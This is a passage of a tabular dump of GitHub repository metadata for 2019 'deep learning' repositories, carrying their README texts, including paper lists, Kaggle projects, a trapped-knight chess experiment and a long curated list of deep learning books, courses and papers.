Paper https arxiv org abs 1704 03135 Code https github com OFRIN TensorflowImprovingPairwiseRankingforMulti labelImageClassification Video Classification Quo Vadis Action Recognition A New Model and the Kinetics Dataset Paper https arxiv org abs 1705 07750 Code Domain Adaptation Domain Adversarial Neural Networks Paper https arxiv org abs 1505 07818 Code Adversarial Discriminative Domain Adaptation Paper https arxiv org abs 1702 05464 Code Keypoint Convolutional Pose Machines Paper https arxiv org abs 1602 00134 Code Stacked Hourglass Networks for Human Pose Estimation Paper https arxiv org abs 1603 06937 Code Unsupervised Learning A Neural Algorithm of Artistic Style Paper https arxiv org abs 1508 06576 Code https github com OFRIN TensorflowANeuralAlgorithmofArtisticStyle Generative Adversarial Networks Paper https arxiv org abs 1406 2661 Code https github com OFRIN TensorflowGAN Unpaired Image to Image Translation using Cycle Consistent Adversarial Networks Paper https arxiv org abs 1703 10593 Code https github com OFRIN TensorflowCycleGAN Image to Image Translation with Conditional Adversarial Networks Paper https arxiv org abs 1611 07004 Code https github com OFRIN TensorflowPixel2Pixel Conditional Generative Adversarial Nets Paper https arxiv org abs 1411 1784 Code https github com OFRIN TensorflowConditionalGAN Unsupervised Representation Learning with Deep Convolutional Generative Adversarial Networks Paper https arxiv org abs 1511 06434 Code https github com OFRIN TensorflowDCGAN Photo Realistic Single Image Super Resolution Using a Generative Adversarial Network Paper https arxiv org abs 1609 04802 Code Component Attention Guided Face Super Resolution Network CAGFace Paper https arxiv org abs 1910 08761 Code StarGAN v2 Diverse Image Synthesis for Multiple Domains Paper https arxiv org abs 1912 01865 Code SinGAN Learning a Generative Model from a Single Natural Image Paper http openaccess thecvf com contentICCV2019 papers ShahamSinGANLearningaGenerativeModelFromaSingleNaturalImageICCV2019paper pdf Code Reinforcement Learning,2019-07-22T16:33:24Z,2019-12-10T16:39:52Z,n/a,OFRIN,User,0,1,0,43,master,OFRIN,1,0,0,0,0,0,0
nidjaj,Deep-learning,n/a,Deep learning,2019-07-03T08:38:06Z,2019-07-17T07:22:01Z,Jupyter Notebook,nidjaj,User,0,1,0,10,master,nidjaj,1,0,0,0,0,0,0
rushabh-wadkar,Deep-Learning,cnn-keras#deep-learning#deep-neural-networks#keras#keras-neural-networks#lstm-neural-networks#mlp-networks#mnist-handwriting-recognition#mnist-image-dataset#python3,Deep Learning This is my deep learning repository where I applied some deep learning state of the art techniques and architecture to the dataset,2019-07-14T12:55:42Z,2019-09-03T07:48:02Z,HTML,rushabh-wadkar,User,0,1,0,2,master,rushabh-wadkar,1,0,0,0,0,0,0
TouhidApps,Machine-Learning-And-Deep-Learning,n/a,Machine Learning And Deep Learning Tensorflow with Android App This is an example and also a resource of below linked tutorials about how to train data with tensorflow and use on Android Project Recognize Image with TensorFlow 2 0 on Android Part 1 of 2 https touhidapps com learn index php 2019 07 28 train data with tensorflow 2 0 convert to tflite Train data with TensorFlow 2 0 Convert to tflite model Recognize Image with TensorFlow 2 0 on Android Part 2 of 2 https touhidapps com learn index php 2019 08 01 recognize image with tensorflow 2 0 on android part 2 of 2 Use tflite file in Android Project,2019-07-28T18:56:22Z,2019-12-04T21:05:14Z,Java,TouhidApps,User,1,1,1,8,master,TouhidApps,1,0,0,0,0,0,0
Aragorn960621,Deep-learning,n/a,Deep learning,2019-07-21T21:20:07Z,2019-08-05T20:58:08Z,Jupyter Notebook,Aragorn960621,User,0,1,0,46,master,Aragorn960621,1,0,0,0,0,0,0
steven0323,Deep-Learning,n/a,,2019-07-11T11:30:01Z,2019-09-29T16:50:45Z,Jupyter Notebook,steven0323,User,0,1,0,6,master,steven0323,1,0,0,0,0,0,0
dario-santos,Deep-Learning,n/a,Deep Learning,2019-07-06T21:11:30Z,2019-07-13T04:22:13Z,Python,dario-santos,User,0,1,0,6,master,dario-santos,1,0,0,0,0,0,0
mjk-software,deep_learning,n/a,Projekt ze ZMAD u,2019-06-28T15:19:38Z,2019-07-02T01:01:20Z,Python,mjk-software,User,0,1,0,2,master,mjk-software,1,0,0,0,2,0,0
vikramforsk2019,DEEP-Learning,n/a,,2019-07-16T16:27:28Z,2019-07-28T07:54:00Z,Jupyter Notebook,vikramforsk2019,User,0,1,0,1,master,vikramforsk2019,1,0,0,0,0,0,0
vaibhav-qa,deep_learning,n/a,,2019-07-24T23:55:24Z,2019-11-08T02:51:59Z,Python,vaibhav-qa,User,0,1,0,1,master,vaibhav-qa,1,0,0,0,0,0,0
sudheernaidu53,Machine-learning-Deep-learning-projects,deep-learning#fill-in-the-blank#fill-in-the-blanks#kaggle#kaggle-competition#kaggle-digit-recognizer#kaggle-house-prices#kaggle-solution#kaggle-titanic#keras#machine-learning#nltk#numberphile#python3#scikit-learn#trapped-knight,Machine learning deep learning projects This repositry contains worked out jupyter notebook files for some kaggle competitions and other Machine learning Deep learning projects img src https upload wikimedia org wikipedia commons 7 7c Kagglelogo png alt https www google com url sa t rct j q esrc s source web cd 1 cad rja uact 8 ved 2ahUKEwjLm5 2rvDjAhVDjuYKHSnBBykQFjAAegQIBRAC url https 3A 2F 2Fwww kaggle com 2F usg AOvVaw358aJVdRF5ENauJCrosrX1 width 250 height 100 border 10 align center Kaggle competitions https github com sudheernaidu53 Machine learning Deep learning projects tree master kaggle 20competitions House Prices Advanced Regression Techniques https github com sudheernaidu53 Machine learning Deep learning projects tree master kaggle 20competitions House 20Prices 20Advanced 20Regression 20Techniques Relevant problem statement and datasets can be found here on kaggle website https www kaggle com c house prices advanced regression techniques Titanic Machine Learning from Disaster https github com sudheernaidu53 Machine learning Deep learning projects tree master kaggle 20competitions Titanic 2C 20machine 20learning 20from 20disaster Relevant problem statement and datasets can be found here on kaggle website https www kaggle com c titanic Digit Recognizer from MNIST data https github com sudheernaidu53 Machine learning Deep learning projects tree master kaggle 20competitions digit 20recogniser Relevant problem statement and datasets can be found here on kaggle website https www kaggle com c digit recognizer Other fun projects Fill in the blanks generator https github com sudheernaidu53 Machine learning Deep learning projects tree master fill 20in 20the 20blanks 20using 20nltk Using nltk library we can create fill in the blanks type questions by randomly selecting proper noun or noun as the blank Trapped Knight https github com sudheernaidu53 Machine learning Deep learning projects tree master The 20trapped 20knight Ever wondered what happens to different chess pieces if there is infinite finite board and it is numbered it in someway and you want to move your chess piece that it keeps moving to unseen squares and are numbered smallest possible here I tried to implement this problem with knight and the pattern of numbers on chess board are increasing outwards spirally Got the inspiration to write this from this numberphile video https www youtube com watch v RGQe8waGJ4w and it s beautiful Find the images of the patterns the knight follow here https github com sudheernaidu53 Machine learning Deep learning projects tree master The 20trapped 20knight images here is how the names and titles are given to images length number after length is number of squares in a row or column of the chessboard pattern two numbers seperated by space after pattern is the pattern which the knight is following while moving infi small board infi board conveys that the knight is trapped because all possible moves have been visited where as small board conveys that the knight is trapped because the board is small constrained and could have moved even more if the board was big struck at the number of the square where the knight is struck on the chessboard after number of moves the knight made before getting trapped Best thing I felt so content when I saw the colorful patterns of knight for different patterns and different board sizes a crucifix a window a windmill I am attaching some images here for your pleasure img src https github com sudheernaidu53 Machine learning Deep learning projects blob master The 20trapped 20knight images length 20 20100 20pattern 20 202 203 20infi 20boardstruck 20at 204698 20after 204634 20steps png width 250 height 250 border 10 img src https github com sudheernaidu53 Machine learning Deep learning projects blob master The 20trapped 20knight images length 20 20150 20pattern 20 203 204 20infi 20boardstruck 20at 201164 20after 201888 20steps png width 250 height 250 border 10 img src https github com sudheernaidu53 Machine learning Deep learning projects blob master The 20trapped 20knight images length 20 201000 20pattern 20 204 2010 20infi 20boardstruck 20at 2026967 20after 207574 20steps png width 250 height 250 border 10 width 100 img src https github com sudheernaidu53 Machine learning Deep learning projects blob master The 20trapped 20knight images length 20 20200 20pattern 20 201 201 20small 20board 20struck 20at 2039105 20after 209802 20stepssquare 20number png width 250 height 250 border 10 width 100 img src https github com sudheernaidu53 Machine learning Deep learning projects blob master The 20trapped 20knight images length 20 20200 20pattern 20 204 205 20infi 20boardstruck 20at 206500 20after 204286 20steps png width 250 height 250 border 10 width 100 img src https github com sudheernaidu53 Machine learning Deep learning projects blob master The 20trapped 20knight images length 20 2050 20pattern 20 202 205 20small 20board 20struck 20at 201577 20after 20827 20steps png width 250 height 250 border 10 width 100 img src https github com sudheernaidu53 Machine learning Deep learning projects blob master The 20trapped 20knight images length 20 20500 20pattern 20 201 2010 20small 20board 20struck 20at 20229976 20after 20200464 20steps png width 250 height 250 border 10 width 100 img src https github com sudheernaidu53 Machine learning Deep learning projects blob master The 20trapped 20knight images length 20 2080 20pattern 20 201 202 20infi 20boardstruck 20at 202084 20after 202016 20steps png width 250 height 250 border 10 width 100 img src https github com sudheernaidu53 Machine learning Deep learning projects blob master The 20trapped 20knight images length 20 20500 20pattern 20 201 2050 20small 20board 20struck 20at 20159638 20after 2068156 20steps png width 250 height 250 border 10 width 100 found this link https oeis org A316667 b316667 txt which tells you where the conventional knight gets trapped for different sizes of chess board in case you want to check if your code is running Multiplicative persistence https github com sudheernaidu53 Machine learning Deep learning projects tree master multiplicative 20persistence multiplicative persistence of a number is basically a measure of how long it can persist from being transformed into a single digit Steps to find multiplicative persistence are as follows 1 if the input number is a single digit it s persistence is 0 as it is already a single digit 2 if input number is of length more than 1 break it into single digits and multiply those digits with each other if resultant number is a single digit number of steps from input number to final single digit is multiplicative persistence 3 if the resultant number is not a single digit perform step two again I Got the inspiration to write this from this numberphile video https www youtube com watch v Wim9WJeDTHQ Matt Parker explained it really well I encourage you to look at it once if you have not yet if we mechanincally code down to find out persistence for each number it will take a lot of time as for big numbers you have to bring it back down to single integer by iterating the process Instead we can use dictionary to keep track of already processed numbers and use processed numbers persistence to calcualte present number s persistence ex persistence 27 persistence 14 1 2 though it seems like not so important we can basically see huge amount of time saved when the numbers get bigger and bigger so what are the keys of numbers to be stored in dictionary as persistence of numbers with permutative digits are always same we should keep the key to be something which should be same for permutative numbers i e say number 23456 and number 45236 should have same key so counting number of occurence of each digit and convertin it to a tuple should work in awesome way ahem ahem those who are wondering why not arrays remember arrays are not hashable And this way we will effectively calculate persistence for only number instead of all of it s permutative equivalents so for example number 234562 will be converted into 0 0 2 1 1 1 1 0 0 0 I have attached the images I got from the analysis of numbers till 10 crores For first image only one number is considered from all equivalent permutative numbers i e out of these numbers 123 231 321 312 132 213 only 123 is considered as all of them have same multiplicative persistence The graph is plotted for different persistences and total number of numbers with each persistence for second image every number till 10 crores are considered i e permutatively equivalent numbers are considered different each one is counted one time If you want accurate numbers in both cases check csv files attached here https github com sudheernaidu53 Machine learning Deep learning projects tree master multiplicative 20persistence img src https github com sudheernaidu53 Machine learning Deep learning projects blob master multiplicative 20persistence persistance 20vs 20number 20of 20numbers 20where 20key 20is 20considered 20i e 20permutative 20numbers 20are 20same png width 350 height 350 border 10 img src https github com sudheernaidu53 Machine learning Deep learning projects blob master multiplicative 20persistence persistance 20vs 20number 20of 20numbers 20where 20number 20is 20considered 20i e 20permutative 20numbers 20are 20different png width 350 height 350 border 10 These are the smallest numbers with respective persistence img src https github com sudheernaidu53 Machine learning Deep learning projects blob master multiplicative 20persistence persistance 20and 20minimum 20number 20with 20that 20persistence JPG align center,2019-07-24T10:41:22Z,2019-08-26T08:11:35Z,Jupyter Notebook,sudheernaidu53,User,0,1,1,36,master,sudheernaidu53,1,0,0,0,0,0,0
sanketgoyal,Deep_Learning,n/a,,2019-07-18T21:22:20Z,2019-07-22T15:08:27Z,Jupyter Notebook,sanketgoyal,User,0,1,0,11,master,sanketgoyal,1,0,0,0,0,0,0
dsam99,deep_learning,n/a,deeplearningmodels A repository containing my implementations of various deep learning models I am implementing models that I have seen in courses and internships from scratch to get a better understanding of the frameworks and the different use cases of each model convolutionnnnumpy A folder containing my implementation of a convolutional neural network from scratch using numpy It will be trained on MNIST dataset which I will import from tensorflow however no other tensorflow functions will be used aaetf1 py My tensorflow version 1 implementation of an adversarial autoencoder It has a generative encoder model a decoder model and a discriminator model autoencoder py My tensorflow implementation of a standard vanilla autoencoder It computes the reconstruction loss mse It was trained on mnist data adversarialautoencoder A folder containing my tensorflow version 2 implementation of an adversarial autoencoder The models py file contains the three seperate models that create the adversarial autoencoder and the adversarialautoencoder py file contains the training and usage of the overal AAE model The model is trained on the cifar10 datset which contains 50000 images of size 32x32 The data processing converts the RGB channels into grayscale before feeding into the convolutional layers DCGAN A folder containing my tensorflow implementation of a deep convolutional generative adversarial network DCGAN The model is trained on the cifar10 dataset and contains a generator discriminator framework to implement adversarial learning LSTM A folder containing my tensorflow implementation of a long short term memory LSTM network The model is trained on the amazon find food reviews dataset that can be found on Kaggle An LSTM is a modified RNN that is particularly good at processing sequential data like text reviews variationalautoencoder A folder containing my tensorflow version 2 implementation of a variational autoencoder The models py file contains the encoder and decoder models that are used in the variational autoencoder The latent space representation is two vectors means variances The decoder model decodes random samples from normal distributions for each latent space dimension to produce a reconstructed output The model is trained on the MNIST dataset,2019-07-19T04:54:40Z,2019-08-27T16:43:13Z,Python,dsam99,User,0,1,0,62,master,dsam99,1,0,0,0,0,0,0
murufeng,deep-learning,deep-learning#deep-learning-tutorial,Deep Learning Table of Contents Free Online Books free online books Courses courses Videos and Lectures videos and lectures Papers papers Tutorials tutorials Researchers researchers Websites websites Datasets datasets Conferences Conferences Frameworks frameworks Tools tools Miscellaneous miscellaneous Contributing contributing Free Online Books 1 Deep Learning http www deeplearningbook org by Yoshua Bengio Ian Goodfellow and Aaron Courville 05 07 2015 2 Neural Networks and Deep Learning http neuralnetworksanddeeplearning com by Michael Nielsen Dec 2014 3 Deep Learning http research microsoft com pubs 209355 DeepLearning NowPublishing Vol7 SIG 039 pdf by Microsoft Research 2013 4 Deep Learning Tutorial http deeplearning net tutorial deeplearning pdf by LISA lab University of Montreal Jan 6 2015 5 neuraltalk https github com karpathy neuraltalk by Andrej Karpathy numpy based RNN LSTM implementation 6 An introduction to genetic algorithms http www boente eti br fuzzy ebook fuzzy mitchell pdf 7 Artificial Intelligence A Modern Approach http aima cs berkeley edu 8 Deep Learning in Neural Networks An Overview http arxiv org pdf 1404 7828v4 pdf 9 Artificial intelligence and machine learning Topic wise explanation https leonardoaraujosantos gitbooks io artificial inteligence Courses 1 Machine Learning Stanford https class coursera org ml 005 by Andrew Ng in Coursera 2010 2014 2 Machine Learning Caltech http work caltech edu lectures html by Yaser Abu Mostafa 2012 2014 3 Machine Learning Carnegie Mellon http www cs cmu edu tom 10701sp11 lectures shtml by Tom Mitchell Spring 2011 2 Neural Networks for Machine Learning https class coursera org neuralnets 2012 001 by Geoffrey Hinton in Coursera 2012 3 Neural networks class https www youtube com playlist list PL6Xpj9I5qXYEcOhn7TqghAJ6NAPrNmUBH by Hugo Larochelle from Universit de Sherbrooke 2013 4 Deep Learning Course http cilvr cs nyu edu doku php id deeplearning slides start by CILVR lab NYU 2014 5 A I Berkeley https courses edx org courses BerkeleyX CS188x1 1T2013 courseware by Dan Klein and Pieter Abbeel 2013 6 A I MIT http ocw mit edu courses electrical engineering and computer science 6 034 artificial intelligence fall 2010 lecture videos by Patrick Henry Winston 2010 7 Vision and learning computers and brains http web mit edu course other i2course www visionandlearningfall2013 html by Shimon Ullman Tomaso Poggio Ethan Meyers MIT 2013 9 Convolutional Neural Networks for Visual Recognition Stanford http vision stanford edu teaching cs231n syllabus html by Fei Fei Li Andrej Karpathy 2017 10 Deep Learning for Natural Language Processing Stanford http cs224d stanford edu 11 Neural Networks usherbrooke http info usherbrooke ca hlarochelle neuralnetworks content html 12 Machine Learning Oxford https www cs ox ac uk people nando defreitas machinelearning 2014 2015 13 Deep Learning Nvidia https developer nvidia com deep learning courses 2015 14 Graduate Summer School Deep Learning Feature Learning https www youtube com playlist list PLHyI3Fbmv0SdzMHAy0aN59oYnLy5vyyTA by Geoffrey Hinton Yoshua Bengio Yann LeCun Andrew Ng Nando de Freitas and several others IPAM UCLA 2012 15 Deep Learning Udacity Google https www udacity com course deep learning ud730 by Vincent Vanhoucke and Arpan Chakraborty 2016 16 Deep Learning UWaterloo https www youtube com playlist list PLehuLRPyt1Hyi78UOkMPWCGRxGcA9NVOE by Prof Ali Ghodsi at University of Waterloo 2015 17 Statistical Machine Learning CMU https www youtube com watch v azaLcvuqlg list PLjbUi5mgii6BWEUZf7He6nowWvGneY8r by Prof Larry Wasserman 18 Deep Learning Course https www college de france fr site en yann lecun course 2015 2016 htm by Yann LeCun 2016 19 Designing Visualizing and Understanding Deep Neural Networks UC Berkeley https www youtube com playlist list PLkFD640KJIxopmdJFCLNqG3QuDFHQUm 20 UVA Deep Learning Course http uvadlc github io MSc in Artificial Intelligence for the University of Amsterdam 21 MIT 6 S094 Deep Learning for Self Driving Cars http selfdrivingcars mit edu 22 MIT 6 S191 Introduction to Deep Learning http introtodeeplearning com 23 Berkeley CS 294 Deep Reinforcement Learning http rll berkeley edu deeprlcourse 24 Keras in Motion video course https www manning com livevideo keras in motion 25 Practical Deep Learning For Coders http course fast ai by Jeremy Howard Fast ai 26 Introduction to Deep Learning http deeplearning cs cmu edu by Prof Bhiksha Raj 2017 27 AI for Everyone https www deeplearning ai ai for everyone by Andrew Ng 2019 28 MIT Intro to Deep Learning 7 day bootcamp https introtodeeplearning com A seven day bootcamp designed in MIT to introduce deep learning methods and applications 2019 29 Deep Blueberry Deep Learning https mithi github io deep blueberry A free five weekend plan to self learners to learn the basics of deep learning architectures like CNNs LSTMs RNNs VAEs GANs DQN A3C and more 2019 30 Spinning Up in Deep Reinforcement Learning https spinningup openai com A free deep reinforcement learning course by OpenAI 2019 Videos and Lectures 1 How To Create A Mind https www youtube com watch v RIkxVci R4k By Ray Kurzweil 2 Deep Learning Self Taught Learning and Unsupervised Feature Learning https www youtube com watch v n1ViNeWhC24 By Andrew Ng 3 Recent Developments in Deep Learning https www youtube com watch v vShMxxqtDDs ampindex 3 amplist PL78U8qQHXgrhP9aZraxTT5 X1RccTcUYT By Geoff Hinton 4 The Unreasonable Effectiveness of Deep Learning https www youtube com watch v sc KbuZqGkI by Yann LeCun 5 Deep Learning of Representations https www youtube com watch v 4xsVFLnHC0 by Yoshua bengio 6 Principles of Hierarchical Temporal Memory https www youtube com watch v 6ufPpZDmPKA by Jeff Hawkins 7 Machine Learning Discussion Group Deep Learning w Stanford AI Lab https www youtube com watch v 2QJi0ArLq7s amplist PL78U8qQHXgrhP9aZraxTT5 X1RccTcUYT by Adam Coates 8 Making Sense of the World with Deep Learning http vimeo com 80821560 By Adam Coates 9 Demystifying Unsupervised Feature Learning https www youtube com watch v wZfVBwOO0 k By Adam Coates 10 Visual Perception with Deep Learning https www youtube com watch v 3boKlkPBckA By Yann LeCun 11 The Next Generation of Neural Networks https www youtube com watch v AyzOUbkUf3M By Geoffrey Hinton at GoogleTechTalks 12 The wonderful and terrifying implications of computers that can learn http www ted com talks jeremyhowardthewonderfulandterrifyingimplicationsofcomputersthatcanlearn By Jeremy Howard at TEDxBrussels 13 Unsupervised Deep Learning Stanford http web stanford edu class cs294a handouts html by Andrew Ng in Stanford 2011 14 Natural Language Processing http web stanford edu class cs224n handouts By Chris Manning in Stanford 15 A beginners Guide to Deep Neural Networks http googleresearch blogspot com 2015 09 a beginners guide to deep neural html By Natalie Hammel and Lorraine Yurshansky 16 Deep Learning Intelligence from Big Data https www youtube com watch v czLI3oLDe8M by Steve Jurvetson and panel at VLAB in Stanford 17 Introduction to Artificial Neural Networks and Deep Learning https www youtube com watch v FoO8qDB8gUU by Leo Isikdogan at Motorola Mobility HQ 18 NIPS 2016 lecture and workshop videos https nips cc Conferences 2016 Schedule NIPS 2016 19 Deep Learning Crash Course https www youtube com watch v oS5fzmHVz0 list PLWKotBjTDoLj3rXBL nEIPRN9V3a9Cx07 a series of mini lectures by Leo Isikdogan on YouTube 2018 Papers You can also find the most cited deep learning papers from here https github com terryum awesome deep learning papers 1 ImageNet Classification with Deep Convolutional Neural Networks http papers nips cc paper 4824 imagenet classification with deep convolutional neural networks pdf 2 Using Very Deep Autoencoders for Content Based Image Retrieval http www cs toronto edu hinton absps esann deep final pdf 3 Learning Deep Architectures for AI http www iro umontreal ca lisa pointeurs TR1312 pdf 4 CMUs list of papers http deeplearning cs cmu edu 5 Neural Networks for Named Entity Recognition http nlp stanford edu socherr pa4ner pdf zip http nlp stanford edu socherr pa4 ner zip 6 Training tricks by YB http www iro umontreal ca bengioy papers YB tricks pdf 7 Geoff Hinton s reading list all papers http www cs toronto edu hinton deeprefs html 8 Supervised Sequence Labelling with Recurrent Neural Networks http www cs toronto edu graves preprint pdf 9 Statistical Language Models based on Neural Networks http www fit vutbr cz imikolov rnnlm thesis pdf 10 Training Recurrent Neural Networks http www cs utoronto ca ilya pubs ilyasutskeverphdthesis pdf 11 Recursive Deep Learning for Natural Language Processing and Computer Vision http nlp stanford edu socherr thesis pdf 12 Bi directional RNN http www di ufpe br fnj RNA bibliografia BRNN pdf 13 LSTM http web eecs utk edu itamar courses ECE 692 Bobbypaper1 pdf 14 GRU Gated Recurrent Unit http arxiv org pdf 1406 1078v3 pdf 15 GFRNN http arxiv org pdf 1502 02367v3 pdf http jmlr org proceedings papers v37 chung15 pdf http jmlr org proceedings papers v37 chung15 supp pdf 16 LSTM A Search Space Odyssey http arxiv org pdf 1503 04069v1 pdf 17 A Critical Review of Recurrent Neural Networks for Sequence Learning http arxiv org pdf 1506 00019v1 pdf 18 Visualizing and Understanding Recurrent Networks http arxiv org pdf 1506 02078v1 pdf 19 Wojciech Zaremba Ilya Sutskever An Empirical Exploration of Recurrent Network Architectures http jmlr org proceedings papers v37 jozefowicz15 pdf 20 Recurrent Neural Network based Language Model http www fit vutbr cz research groups speech publi 2010 mikolovinterspeech2010IS100722 pdf 21 Extensions of Recurrent Neural Network Language Model http www fit vutbr cz research groups speech publi 2011 mikolovicassp20115528 pdf 22 Recurrent Neural Network based Language Modeling in Meeting Recognition http www fit vutbr cz imikolov rnnlm ApplicationOfRNNinMeetingRecognitionIS2011 pdf 23 Deep Neural Networks for Acoustic Modeling in Speech Recognition http cs224d stanford edu papers maaspaper pdf 24 Speech Recognition with Deep Recurrent Neural Networks http www cs toronto edu fritz absps RNN13 pdf 25 Reinforcement Learning Neural Turing Machines http arxiv org pdf 1505 00521v1 26 Learning Phrase Representations using RNN Encoder Decoder for Statistical Machine Translation http arxiv org pdf 1406 1078v3 pdf 27 Google Sequence to Sequence Learning with Neural Networks http papers nips cc paper 5346 sequence to sequence learning with neural networks pdf 28 Memory Networks http arxiv org pdf 1410 3916v10 29 Policy Learning with Continuous Memory States for Partially Observed Robotic Control http arxiv org pdf 1507 01273v1 30 Microsoft Jointly Modeling Embedding and Translation to Bridge Video and Language http arxiv org pdf 1505 01861v1 pdf 31 Neural Turing Machines http arxiv org pdf 1410 5401v2 pdf 32 Ask Me Anything Dynamic Memory Networks for Natural Language Processing http arxiv org pdf 1506 07285v1 pdf 33 Mastering the Game of Go with Deep Neural Networks and Tree Search http www nature com nature journal v529 n7587 pdf nature16961 pdf 34 Batch Normalization https arxiv org abs 1502 03167 35 Residual Learning https arxiv org pdf 1512 03385v1 pdf 36 Image to Image Translation with Conditional Adversarial Networks https arxiv org pdf 1611 07004v1 pdf 37 Berkeley AI Research BAIR Laboratory https arxiv org pdf 1611 07004v1 pdf 38 MobileNets by Google https arxiv org abs 1704 04861 39 Cross Audio Visual Recognition in the Wild Using Deep Learning https arxiv org abs 1706 05739 40 Dynamic Routing Between Capsules https arxiv org abs 1710 09829 41 Matrix Capsules With Em Routing https openreview net pdf id HJWLfGWRb 42 Efficient BackProp http yann lecun com exdb publis pdf lecun 98b pdf Tutorials 1 UFLDL Tutorial 1 http deeplearning stanford edu wiki index php UFLDLTutorial 2 UFLDL Tutorial 2 http ufldl stanford edu tutorial supervised LinearRegression 3 Deep Learning for NLP without Magic http www socher org index php DeepLearningTutorial DeepLearningTutorial 4 A Deep Learning Tutorial From Perceptrons to Deep Networks http www toptal com machine learning an introduction to deep learning from perceptrons to deep networks 5 Deep Learning from the Bottom up http www metacademy org roadmaps rgrosse deeplearning 6 Theano Tutorial http deeplearning net tutorial deeplearning pdf 7 Neural Networks for Matlab http uk mathworks com help pdfdoc nnet nnetug pdf 8 Using convolutional neural nets to detect facial keypoints tutorial http danielnouri org notes 2014 12 17 using convolutional neural nets to detect facial keypoints tutorial 9 Torch7 Tutorials https github com clementfarabet ipam tutorials tree master thtutorials 10 The Best Machine Learning Tutorials On The Web https github com josephmisiti machine learning module 11 VGG Convolutional Neural Networks Practical http www robots ox ac uk vgg practicals cnn index html 12 TensorFlow tutorials https github com nlintz TensorFlow Tutorials 13 More TensorFlow tutorials https github com pkmital tensorflowtutorials 13 TensorFlow Python Notebooks https github com aymericdamien TensorFlow Examples 14 Keras and Lasagne Deep Learning Tutorials https github com Vict0rSch deeplearning 15 Classification on raw time series in TensorFlow with a LSTM RNN https github com guillaume chevalier LSTM Human Activity Recognition 16 Using convolutional neural nets to detect facial keypoints tutorial http danielnouri org notes 2014 12 17 using convolutional neural nets to detect facial keypoints tutorial 17 TensorFlow World https github com astorfi TensorFlow World 18 Deep Learning with Python https www manning com books deep learning with python 19 Grokking Deep Learning https www manning com books grokking deep learning 20 Deep Learning for Search https www manning com books deep learning for search 21 Keras Tutorial Content Based Image Retrieval Using a Convolutional Denoising Autoencoder https blog sicara com keras tutorial content based image retrieval convolutional denoising autoencoder dc91450cc511 22 Pytorch Tutorial by Yunjey Choi https github com yunjey pytorch tutorial Researchers 1 Aaron Courville http aaroncourville wordpress com 2 Abdel rahman Mohamed http www cs toronto edu asamir 3 Adam Coates http cs stanford edu acoates 4 Alex Acero http research microsoft com en us people alexac 5 Alex Krizhevsky http www cs utoronto ca kriz index html 6 Alexander Ilin http users ics aalto fi alexilin 7 Amos Storkey http homepages inf ed ac uk amos 8 Andrej Karpathy http cs stanford edu karpathy 9 Andrew M Saxe http www stanford edu asaxe 10 Andrew Ng http www cs stanford edu people ang 11 Andrew W Senior http research google com pubs author37792 html 12 Andriy Mnih http www gatsby ucl ac uk amnih 13 Ayse Naz Erkan http www cs nyu edu naz 14 Benjamin Schrauwen http reslab elis ugent be benjamin 15 Bernardete Ribeiro https www cisuc uc pt people show 2020 16 Bo David Chen http vision caltech edu bchen3 Site BoDavidChen html 17 Boureau Y Lan http cs nyu edu ylan 18 ,2019-07-24T10:18:05Z,2019-07-26T00:35:18Z,n/a,murufeng,User,0,1,4,5,master,murufeng,1,0,0,0,0,0,0
MorganWoods,Deep_Learning,n/a,Deep learning works This repo includes DL works projects projects HEU buildings classification The target is buildings road landmark etc recogonization and classification HEU mainbuildings classification programme https github com MorganWoods DeepLearning blob master 1HEUbuilding 1code wmhcode py Os operation rename files programme https github com MorganWoods DeepLearning blob master 1HEUbuilding 1code preprocessing py Image matting Applying neural network to do image matting matting with removebg library https github com MorganWoods DeepLearning blob master 2Imagematting removebg py trival Tutorial Machin Learning tutorial for beginner https github com MorganWoods DeepLearning tree master Tutorial MNIST MNIST https github com MorganWoods DeepLearning blob master MNIST MNIST01 py,2019-07-20T02:21:17Z,2019-10-23T11:48:32Z,Python,MorganWoods,User,0,1,0,32,master,MorganWoods,1,0,0,0,0,0,0
Jaavidd,Deep-Learning,n/a,Deep Learning Some practice of deep learning problems This is my first simple code of Neural Network problem with deep forward algorithm Here I train a data for digit recognizing MNIST dataset,2019-07-10T12:17:24Z,2019-10-12T19:00:26Z,Python,Jaavidd,User,0,1,0,6,master,Jaavidd,1,0,0,0,0,0,0
oscarfont,deep-learning,n/a,Deep Learning Laboratories of the Deep Learning course carried out with vipermu and diegovincent in our last year of our Bachelor at Universitat Pompeu Fabra Course name Deep Learning Language Python IDE Google Colab Objectives Learn to use some of the latest Neural Network Architectures for their different applications with the corresponding Deep Learning techniques and PyTorch Description Laboratories Lab1 Basic Convolutional Neural Networks CNN Lab2 Different CNN Architectures HourGlass and ResNet Lab3 Recurrent Neural Networks RNN and Long short term memory Neural Networks LSTM Lab4 Autoencoders and Generative Adversarial Networks GANs,2019-07-26T11:00:36Z,2019-07-29T09:02:55Z,Jupyter Notebook,oscarfont,User,0,1,0,7,master,oscarfont,1,0,0,0,0,0,0
miladtoutounchian,Deep-Learning-,n/a,,2019-07-29T16:59:15Z,2019-09-01T20:08:49Z,Python,miladtoutounchian,User,1,1,0,0,master,,0,0,0,0,0,0,0
ankit3466,Deep-Learning,n/a,Deep Learning,2019-07-10T14:45:32Z,2019-08-14T12:00:49Z,Jupyter Notebook,ankit3466,User,0,1,0,17,master,ankit3466,1,0,0,0,0,0,0
samyeh0527,deep-learning,n/a,deep learning Stock Prices Prediction Using Deep Learning Techniques yahooLSTMFACEBOOKProphetRMSE ProphetLSTMLSTM GRUStateful LSTMRMSELSTMLSTM GRU LSTMLSTM GRUProphetRMSE CPU intel E3 1225v6 3 3GHZ GPU NVIDIA Quadro P600 RAM 16G Visual studio 2019 keras 2 2 4 python 3 6 8 Anaconda 2019 03 quandl 3 4 5 matplotlib 3 0 3 tensorflow 1 13 1 numpy 1 16 3 pystan 2 18 pandas 0 24 2 pytrends 4 4 0 fbprophet 0 4 post2,2019-07-22T04:51:15Z,2019-12-08T01:16:33Z,Python,samyeh0527,User,2,1,0,10,master,samyeh0527,1,0,0,0,0,0,0
Amit2Maity,Deep-Learning,n/a,,2019-07-12T04:39:51Z,2019-07-12T06:00:05Z,Jupyter Notebook,Amit2Maity,User,0,1,0,3,master,Amit2Maity,1,0,0,0,0,0,0
